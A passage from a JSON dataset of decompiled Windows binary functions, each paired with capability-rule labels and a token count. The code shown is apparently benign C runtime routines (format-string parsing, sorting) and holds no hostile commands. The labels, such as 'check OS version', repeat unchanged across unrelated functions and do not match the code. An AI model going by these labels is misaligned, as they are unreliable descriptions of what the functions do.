        "decompiled_code": "\nuint __thiscall\nfcn.00403035(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.00403c8d();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049ace9:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049acd6:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049ace9;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.00401efb(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49ad04\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.00405592();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049acd6;\n                    case 2:\n                        cVar1 = fcn.00405204();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00402c16();\n                        break;\n                    case 4:\n                        goto code_r0x0049acb0;\n                    case 5:\n                        cVar1 = fcn.00401ad2();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00402a3b();\n                        break;\n                    case 7:\n                        cVar1 = fcn.004028bf(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049ac43;\n                    default:\n                        goto code_r0x0049ac30;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049acd6;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n            } while( true );\n        }\ncode_r0x0049ac30:\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n    }\ncode_r0x0049ac43:\n    return 0xffffffff;\ncode_r0x0049acb0:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049acd6;\n}\n",
        "token_count": 928
    },
    "00403094": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403094(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 95
    },
    "00403143": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403143(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00405957();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049b1cb:\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049b272:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049b289;\n                    uVar4 = fcn.00405fa6(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49b2b3\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.00405227();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049b272;\n                    case 2:\n                        cVar2 = fcn.0040295a();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00405ff1();\n                        break;\n                    case 4:\n                        goto code_r0x0049b24c;\n                    case 5:\n                        cVar2 = fcn.00402a2c();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00403ba2();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00401af5();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049b1de;\n                    default:\n                        goto code_r0x0049b1cb;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049b272;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049b289:\n                cVar2 = fcn.00402153();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049b1de:\n    return 0xffffffff;\ncode_r0x0049b24c:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049b272;\n}\n",
        "token_count": 837
    },
    "00403571": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403571(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 95
    },
    "00403869": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00403869(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.004053f3();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049ad89:\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049ae2f:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049ae42;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.004016f9(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49ae6d\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.00401410();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049ae2f;\n                    case 2:\n                        cVar1 = fcn.00403139();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00401064();\n                        break;\n                    case 4:\n                        goto code_r0x0049ae09;\n                    case 5:\n                        cVar1 = fcn.0040365c();\n                        break;\n                    case 6:\n                        cVar1 = fcn.004032f1();\n                        break;\n                    case 7:\n                        cVar1 = fcn.00406343(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049ad9c;\n                    default:\n                        goto code_r0x0049ad89;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049ae2f;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049ae42:\n                cVar1 = fcn.004041e2();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049ad9c:\n    return 0xffffffff;\ncode_r0x0049ae09:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049ae2f;\n}\n",
        "token_count": 955
    },
    "004038ff": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004038ff(code *arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.pDNameNode.0;\n    if ((arg_8h != NULL) && ((arg_8h[4] == 0x2 || (arg_8h[4] == 0x3)))) {\n        arg_8h = NULL;\n    }\n    in_ECX[1] = arg_8h;\n    return;\n}\n",
        "token_count": 108
    },
    "004041d3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.004041d3(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.004053f3();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049b12b:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049b118:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049b12b;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.00403e27(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49b146\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.00403e95();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049b118;\n                    case 2:\n                        cVar1 = fcn.00401537();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00401811();\n                        break;\n                    case 4:\n                        goto code_r0x0049b0f2;\n                    case 5:\n                        cVar1 = fcn.00405c54();\n                        break;\n                    case 6:\n                        cVar1 = fcn.004066d6();\n                        break;\n                    case 7:\n                        cVar1 = fcn.00401eb5(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049b085;\n                    default:\n                        goto code_r0x0049b072;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049b118;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n            } while( true );\n        }\ncode_r0x0049b072:\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n    }\ncode_r0x0049b085:\n    return 0xffffffff;\ncode_r0x0049b0f2:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049b118;\n}\n",
        "token_count": 934
    },
    "00404417": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404417(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00402d3d();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049b621:\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049b6c8:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049b6df;\n                    uVar4 = fcn.00405506(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49b709\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.00401168();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049b6c8;\n                    case 2:\n                        cVar2 = fcn.004019ec();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00401a55();\n                        break;\n                    case 4:\n                        goto code_r0x0049b6a2;\n                    case 5:\n                        cVar2 = fcn.00402491();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00405452();\n                        break;\n                    case 7:\n                        cVar2 = fcn.0040354e();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049b634;\n                    default:\n                        goto code_r0x0049b621;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049b6c8;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049b6df:\n                cVar2 = fcn.00403d1e();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049b634:\n    return 0xffffffff;\ncode_r0x0049b6a2:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049b6c8;\n}\n",
        "token_count": 842
    },
    "004046ba": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004046ba(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00405957();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049b57c:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049b565:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049b57c;\n                    uVar4 = fcn.00404d13(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49b59a\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.0040662c();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049b565;\n                    case 2:\n                        cVar2 = fcn.004031f7();\n                        break;\n                    case 3:\n                        cVar2 = fcn.004024c8();\n                        break;\n                    case 4:\n                        goto code_r0x0049b53f;\n                    case 5:\n                        cVar2 = fcn.0040529f();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00405650();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00402f68();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049b4d1;\n                    default:\n                        goto code_r0x0049b4be;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049b565;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            } while( true );\n        }\ncode_r0x0049b4be:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\ncode_r0x0049b4d1:\n    return 0xffffffff;\ncode_r0x0049b53f:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049b565;\n}\n",
        "token_count": 817
    },
    "00404caf": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404caf(uint16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *var_8h;\n    uint16_t *var_4h;\n    \n    if (*(param_1 + 0xe) != 1) goto code_r0x004a65e6;\n    in_EAX = *(param_1 + 8);\n    uVar1 = *in_EAX;\n    if (uVar1 == 0x25) goto code_r0x004a65e6;\n    iVar2 = *(param_1 + 0x22e);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n            *(param_1 + 0x22e) = 1;\n            iVar2 = 1;\n            goto code_r0x004a65f5;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.00403607(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != 0x24)) {\n            *(param_1 + 0x22e) = 1;\n            goto code_r0x004a65e6;\n        }\n        if (*(param_1 + 0x22c) == 1) {\n            fcn.0040314d(param_1 + 0x232, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 8);\n        *(param_1 + 0x22e) = 2;\n    }\n    else {\ncode_r0x004a65f5:\n        if (iVar2 != 2) goto code_r0x004a65e6;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.00403607(in_EAX, &var_8h, 10);\n    puVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0x554) = puVar5;\n    *(param_1 + 8) = in_EAX;\n    if (*(param_1 + 0x22c) == 1) {\n        if (((puVar5 < 0) || (*var_8h != 0x24)) || (99 < puVar5)) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            uVar4 = fcn.00403751();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0x552);\n        if (puVar5 <= in_EAX) {\n            puVar5 = in_EAX;\n        }\n        *(param_1 + 0x552) = puVar5;\n    }\ncode_r0x004a65e6:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 738
    },
    "00404ed0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404ed0(char *param_1)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *var_8h;\n    char *var_4h;\n    \n    if (*(param_1 + 0x1c) != 1) goto code_r0x004a64aa;\n    in_EAX = *(param_1 + 0x10);\n    cVar1 = *in_EAX;\n    if (cVar1 == '%') goto code_r0x004a64aa;\n    iVar2 = *(param_1 + 0x45c);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((cVar1 < '0') || ('9' < cVar1)) {\n            *(param_1 + 0x45c) = 1;\n            iVar2 = 1;\n            goto code_r0x004a64b8;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.004048e5(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != '$')) {\n            *(param_1 + 0x45c) = 1;\n            goto code_r0x004a64aa;\n        }\n        if (*(param_1 + 0x458) == 1) {\n            fcn.0040314d(param_1 + 0x464, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 0x10);\n        *(param_1 + 0x45c) = 2;\n    }\n    else {\ncode_r0x004a64b8:\n        if (iVar2 != 2) goto code_r0x004a64aa;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.004048e5(in_EAX, &var_8h, 10);\n    pcVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0xaa8) = pcVar5;\n    *(param_1 + 0x10) = in_EAX;\n    if (*(param_1 + 0x458) == 1) {\n        if (((pcVar5 < 0) || (*var_8h != '$')) || (99 < pcVar5)) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            uVar4 = fcn.00403751();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0xaa4);\n        if (pcVar5 <= in_EAX) {\n            pcVar5 = in_EAX;\n        }\n        *(param_1 + 0xaa4) = pcVar5;\n    }\ncode_r0x004a64aa:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 718
    },
    "004055bf": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n\nvoid __cdecl fcn.004055bf(uchar *arg_8h, uint32_t arg_ch, uint32_t arg_10h, code *arg_14h)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int32_t var_118h;\n    uint var_114h;\n    uint var_110h;\n    uchar *var_10ch;\n    uint var_108h;\n    uchar *var_104h;\n    uint var_100h;\n    uchar *var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_104h = arg_8h;\n    if ((((arg_8h == NULL) && (arg_ch != 0)) || (arg_10h == 0)) || (arg_14h == NULL)) {\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        var_118h = 0;\n        if (1 < arg_ch) {\n            puVar7 = arg_8h + (arg_ch - 1) * arg_10h;\ncode_r0x004da712:\n            while (uVar4 = (puVar7 - var_104h) / arg_10h + 1,  8 < uVar4) {\n                iVar5 = (uVar4 >> 1) * arg_10h;\n                puVar8 = var_104h + iVar5;\n                (**0x573000)(var_104h, puVar8);\n                iVar6 = (*arg_14h)();\n                if ((0 < iVar6) && (uVar4 = arg_10h,  puVar10 = puVar8,  var_104h != puVar8)) {\n                    do {\n                        uVar2 = puVar10[-iVar5];\n                        puVar10[-iVar5] = *puVar10;\n                        *puVar10 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar10 = puVar10 + 1;\n                    } while (uVar4 != 0);\n                }\n                (**0x573000)(var_104h, puVar7);\n                iVar5 = (*arg_14h)();\n                if ((0 < iVar5) && (uVar4 = arg_10h,  puVar10 = puVar7,  var_104h != puVar7)) {\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar2 = puVar9[var_104h + (-1 - puVar7)];\n                        puVar9[var_104h + (-1 - puVar7)] = *puVar10;\n                        *puVar10 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar10 = puVar9;\n                    } while (uVar4 != 0);\n                }\n                (**0x573000)(puVar8, puVar7);\n                iVar5 = (*arg_14h)();\n                var_10ch = var_104h;\n                var_fch = puVar7;\n                if ((0 < iVar5) && (uVar4 = arg_10h,  puVar10 = puVar7,  puVar8 != puVar7)) {\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar2 = puVar9[puVar8 + (-1 - puVar7)];\n                        puVar9[puVar8 + (-1 - puVar7)] = *puVar10;\n                        *puVar10 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar10 = puVar9;\n                    } while (uVar4 != 0);\n                }\ncode_r0x004da923:\n                if (var_10ch < puVar8) {\n                    do {\n                        var_10ch = var_10ch + arg_10h;\n                        if (puVar8 <= var_10ch) goto code_r0x004da970;\n                        (**0x573000)(var_10ch, puVar8);\n                        iVar5 = (*arg_14h)();\n                        puVar10 = var_fch;\n                    } while (iVar5 < 1);\n                }\n                else {\ncode_r0x004da970:\n                    do {\n                        var_10ch = var_10ch + arg_10h;\n                        puVar10 = var_fch;\n                        if (puVar7 < var_10ch) break;\n                        (**0x573000)(var_10ch, puVar8);\n                        iVar5 = (*arg_14h)();\n                    } while (iVar5 < 1);\n                }\n                do {\n                    var_fch = puVar10;\n                    puVar10 = var_fch + -arg_10h;\n                    if (puVar10 <= puVar8) break;\n                    (**0x573000)(puVar10, puVar8);\n                    iVar5 = (*arg_14h)();\n                } while (0 < iVar5);\n                if (var_10ch <= puVar10) {\n                    puVar9 = puVar10;\n                    uVar4 = arg_10h;\n                    if (puVar10 != var_10ch) {\n                        do {\n                            puVar1 = puVar9 + 1;\n                            uVar2 = puVar1[var_10ch + (-1 - puVar10)];\n                            puVar1[var_10ch + (-1 - puVar10)] = *puVar9;\n                            *puVar9 = uVar2;\n                            uVar4 = uVar4 - 1;\n                            puVar9 = puVar1;\n                        } while (uVar4 != 0);\n                    }\n                    var_fch = puVar10;\n                    if (puVar8 == puVar10) {\n                        puVar8 = var_10ch;\n                    }\n                    goto code_r0x004da923;\n                }\n                if (puVar8 < var_fch) {\n                    do {\n                        var_fch = var_fch + -arg_10h;\n                        if (var_fch <= puVar8) goto code_r0x004daa90;\n                        (**0x573000)(var_fch, puVar8);\n                        iVar5 = (*arg_14h)();\n                    } while (iVar5 == 0);\n                }\n                else {\ncode_r0x004daa90:\n                    do {\n                        var_fch = var_fch + -arg_10h;\n                        if (var_fch <= var_104h) break;\n                        (**0x573000)(var_fch, puVar8);\n                        iVar5 = (*arg_14h)();\n                    } while (iVar5 == 0);\n                }\n                if (var_fch - var_104h < puVar7 - var_10ch) goto code_r0x004dab1a;\n                if (var_104h < var_fch) {\n                    (&var_7ch)[var_118h] = var_104h;\n                    (&var_f4h)[var_118h] = var_fch;\n                    var_118h = var_118h + 1;\n                }\n                var_104h = var_10ch;\n                if (puVar7 <= var_10ch) goto code_r0x004dab53;\n            }\n            for (; puVar10 = var_104h,  puVar8 = var_104h,  var_104h < puVar7; puVar7 = puVar7 + -arg_10h) {\n                while (puVar8 = puVar8 + arg_10h,  puVar8 <= puVar7) {\n                    (**0x573000)(puVar8, puVar10);\n                    iVar5 = 